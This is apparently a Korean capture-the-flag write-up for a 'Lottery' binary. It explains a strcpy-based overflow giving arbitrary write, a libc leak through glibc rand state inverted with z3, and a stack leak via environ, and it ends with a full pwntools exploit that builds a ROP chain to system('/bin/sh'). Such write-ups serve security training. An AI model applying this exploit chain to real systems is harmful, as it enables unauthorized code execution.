# Lottery

# Usage

# Concept

- BOF, AAW, `rand`

# Writeup

## 취약점

`readString` 함수에서 사용하는 `strcpy` 로 인하여 취약점이 발생한다. 입력받을 문자의 개수만큼만 `tmpBuf` 를 초기화하기 때문에 만약 이전에 더 큰 입력을 받았던 값이 남아있다면, `strcpy` 함수를 통해서 버퍼에 남아있었던 값들이 추가로 복사되어 버퍼오버플로우를 유발한다. 

```c
char *__fastcall readString(char *a1, size_t a2)
{
  char *result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  if ( a2 <= 0x20 )
  {
    for ( i = 0; i < a2; ++i )
      *(&tmpBuf + i) = 0;
    read(0, &tmpBuf, a2);
    return strcpy(a1, &tmpBuf);
  }
  return result;
}
```

본 문제에서는 `wish` 함수에서 8바이트의 입력이 가능하고, 만약 `draw` 함수에서 로또번호를 맞추면 코멘트를 16바이트 입력하게 해준다. 만약 9바이트 이상 코멘트를 입력한다면 wish 함수의 버퍼를 넘어 인덱스 변수까시 덮어쓰게 된다. 스택 프로텍트 옵션이 있지 않기 때문에 버퍼 뒤에 변수가 위치하는 상황이 연출되었다.

```c
char *wish()
{
  char src[8]; // [rsp+8h] [rbp-18h] BYREF
  unsigned __int64 Int; // [rsp+10h] [rbp-10h]
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  *(_QWORD *)src = 0LL;
  myPrint("Lottery index : ");
  Int = (int)readInt();
  if ( Int >= 0x200 )
    return (char *)myPrint("Bad index :(\n");
  myPrint("Lottery number : ");
  readString(src, 8LL);
  for ( i = 0; i <= 7; ++i )
  {
    if ( src[i] == 10 )
      src[i] = 0;
  }
  return strcpy((char *)(mem + 8 * Int), src);
}
```

여기서 전역변수 mem 은 `mmap` 함수를 통해 할당된점을 고려하면 libc 영역에서 OOB 를 통한 Arbitrary ddress Write가 가능해짐을 알 수 있다. 

이제 AAW를 통해서 libc leak을 해야한다. 표준입출력을 사용하는 함수를 바이너리에서 사용하지 않기 때문에 유명한 stdin, stdout 의 flag 변조를 통한 leak 이 불가능하기 때문에 다른 방법으로 접근할 필요가 있다. 

## rand 내부 로직

이 문제를 풀기 위해서는 문제의 설명처럼 `rand` 함수의 몇가지 내부 로직을 아는 것이 핵심이다. 
아래 코드에서 볼 수 있듯이  `rand_type` == `TYPE_0` 일 때 랜덤값을 하나만 아는 것으로 다음 랜덤값들을 계산할 수 있다. (`val` 변수가 `rand`의 반환값)

또한 `int*`  자료형인 state 포인터를 조작한다면 `rand` 함수의 결과값으로 해당 포인터의 값을 유추할 수 있다. 

```c
int
__random_r (struct random_data *buf, int32_t *result)
{
  int32_t *state;

  if (buf == NULL || result == NULL)
    goto fail;

  state = buf->state;

  if (buf->rand_type == TYPE_0)
    {
      int32_t val = ((state[0] * 1103515245U) + 12345U) & 0x7fffffff;
      state[0] = val;
      *result = val;
    }
  else
    {
      ...
```

문제에서는 `initialize` 에서 아래와 같이 기본적으로 `rand_type` 을 `TYPE_0` 로 설정해준다. `setstate` 함수는 보통 잘 사용하지 않는 생소한 함수인데, `rand` 함수의 내부상태를 설정하는데 쓰이는 함수이다. 첫번째 4바이트는 `rand_type` 두번째 4바이트는 초기 시드값이다. 

```cpp
*(_DWORD *)state = 0;
unk_40404C = seed;
setstate(state);
```

## leak

위의 `rand` 함수 로직을 통해서 우리는 현재의 랜덤값으로 다음에 나올 랜덤값을 알 수 있고, 이를 이용하면 `draw` 함수에서 코멘트를 작성할 수 있다. 취약점 파트에서 언급한 것 처럼 AAW 가 가능하기 때문에 libc 영역을 덮을 수 있는데 `__random_r` 함수에서 사용하는 buf→state 포인터를 libc 의 주소를 담고 있는 주소(즉 포인터)로 덮는다면, 다음 `rand` 값은 libc 주소를 바탕으로 계산된 값이기 때문에 확률적인 역산이 가능하다! (확률적인 이유는 곱하는 과정에서 오버플로 된 값들은 무시되기 때문이다.)

그렇다면 buf→state 를 어떤 주소로 덮을지 고민해야 하는데, 문제에서 c 표준입출력을 사용하는 함수는 사용하지 않았지만 `initialize` 함수에서 `setbuf`를 이용하면서 stdin, stdout 을 사용했기 때문에 바이너리의  rw 영역에 stdin, stdout 이 있으므로 이 주소를 이용하면 된다. 이를 이용하면 결론적으로 stdin 또는 stdout 의 주소를 leak 할 수 있다. 

추가로 buf→state 포인터는 int* 형이기 때문에 한번에 6바이트의 주소를 leak 할 수 없다. 따라서 2번에 걸쳐서 계산을 해야한다. 그리고 랜덤값 계산 로직상 역산 결과가 여러가지가 나올 수 있기 때문에 기본적으로 확률 익스플로잇이다. 익스플로잇 코드에서는 z3-sovler를 이용해서 계산하였다. 

## system(”/bin/sh”)

크게 `exit_function_list` 를 덮는 방법과 스택포인터를 덮는 방법이 있다. 

본 풀이에서는 스택포인터를 덮는 방법으로 풀이를 했다. `environ` 포인터를 이용해서 스택포인터를 leak 하고, `wish` 함수의 RET + 0x30에 rop 페이로드를 구성한다. 마지막으로 `add rsp + 0x28` 가젯을 이용해서 `system` 함수를 실행시킨다. 주의할 점은 `environ` 포인터를 이용해서 leak 을 하게 되면 해당 포인터가 망가지게 된다. `system` 함수는 `environ` 포인터가 정상적이지 않으면 동작을 하지 않기 때문에 이를 복구해주는 과정이 포함되어야한다. 

스택포인터의 계산과 `environ` 포인터 복구가 귀찮기 때문에, 전자의 방법이 풀이자 입장에서는 더 쉬울 것이라고 생각된다.

~~원래 버전에서는 exit 를 실행할 수 없었지만, 난이도 조절 이슈로 수정한 것은 비밀이다~~

## 리모트 익스플로잇 
본 문제에서는 처음에 `mmap` 을 통해서 메모리를 할당받고 해당 메모리 기준으로 AAW 가 가능하기 때문에 도커를 사용하더라도 서버와 오프셋이 다를 수 있다. 리모트 익스플로잇을 위해서는 libc 베이스 주소와 `mmap` 으로 할당받은 영역의 차이만 알면 되기 때문에, 문제 프로세스를 생성하고 메모리맵을 보여주는 helper 바이너리가 존재한다. 이를 참고하여 브루트 포싱 없이 익스플로잇 코드를 작성할 수 있다. 

```python
from pwn import*
from z3 import*

def wish(idx, content):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(str(idx).encode())
    p.recvuntil(b':')
    p.send(content)

def draw(comment):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b' : ')
    p.send(comment)

def getLucky():
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'is ')
    return int(p.recvline()[:-1])

def getNext(cur):
    return ((cur * 1103515245) + 12345) & 0x7fffffff

def aaw(offset, val, neg = True):
    if neg:
        offset = negate(offset, width = 64)
    nextRand = getNext(getLucky())
    wish(0, p64(nextRand))
    draw(b'A' * 8 + p64(offset))
    wish(0, p64(val).replace(b'\x00', b'\x0a'))

#If set pr, z3 ignores result at pr-1 times.
def leak(pr = 1):
    num = getLucky()
    s = Solver()
    x = BitVec('x', 64)
    s.add(((x * 1103515245) + 12345) & 0x7fffffff == num)
    s.check()
    result = s.model().eval(x).as_long()
    pr -= 1
    while pr > 0:
        s.add(x != result)
        s.check()
        result = s.model().eval(x).as_long()
        pr -= 1
    return result

p = remote('localhost', 15353)
sleep(1)
#get remote mmap, libc address
while True:
    line = p.recvline()
    if b'libc.so.6' in line:
        libc_start = int(line[:-1].split(b'-')[0], 16)
        break
while True:
    line = p.recvline()
    if b'ld-linux-x86-64.so.2' in line:
        p.recvline()
        p.recvline()
        line = p.recvline()
        mem_start = int(line[:-1].split(b'-')[0], 16)
        break
p.close()
while True:
    try:
        unsafe_state = 0x21a860
        p = remote('localhost', 15252)
        #Step 1. libc leak
        #set buf->state to stdout
        stdout_addr = 0x404020
        aaw(((mem_start - (libc_start + unsafe_state + 0x10))// 8), stdout_addr)
        #reverse stdout lower 4-bytes
        stdout = leak()
        #set buf->state to stdout + 4
        aaw(((mem_start - (libc_start + unsafe_state + 0x10))// 8), stdout_addr + 4)
        #reverse stdout higher 2-bytes
        stdout += leak() << 32
        #debugging
        log.info('stdout : ' + hex(stdout))
        libc_elf = ELF('./libc-2.35.so')
        libc = stdout - libc_elf.symbols['_IO_2_1_stdout_']
        system = libc + libc_elf.symbols['system']
        binsh = libc + 0x1d8678
        pop_rdi = libc + 0x1bbea1
        add_rsp = libc + 0x1127a7
        ret = libc + 0x1b4b28
        exit = libc + libc_elf.symbols['exit']
        mem = libc + (mem_start - libc_start)
        environ = libc + libc_elf.symbols['environ']
        log.info('environ : ' + hex(environ))
        log.info('libc : ' + hex(libc))
        log.info('mem : ' + hex(mem))
        #Step 2. environ leak
        #because enviroion pointer ends with NULL, we leak environ + 1 address.
        aaw((mem_start - (libc_start + unsafe_state + 0x10))// 8, environ + 1)
        #stack address is almost lacted at the high address. If reverse z3 at one time, it returns lower address.
        stack = leak(pr = 2) << 8
        stack += 0x7f0000000000
        #get inveron lowest byte
        aaw((mem_start - (libc_start + unsafe_state + 0x10))// 8, environ)
        stack += leak() & 0xFF
        org_environ = stack
        stack -= 0x140
        log.info('stack : ' + hex(stack))
        #restore environ
        aaw((mem_start - (libc_start + unsafe_state + 0x10)) // 8, mem + 0x110)
        aaw((mem - environ + 1) // 8, org_environ >> 8)
        aaw((mem - environ) // 8, org_environ)
        # add rsp, 0x28; | ret(for stack align) | ... | pop rdi; ret; | /bin/sh address | system
        aaw((stack - mem + 0x30) // 8, ret, neg = False)
        aaw((stack - mem + 0x38) // 8, pop_rdi, neg = False)
        aaw((stack - mem + 0x40) // 8, binsh, neg = False)
        aaw((stack - mem + 0x48) // 8, system, neg = False)
        aaw((stack - mem) // 8, add_rsp, neg = False)
        p.interactive()
        exit(0)
    except:
        p.close()

```
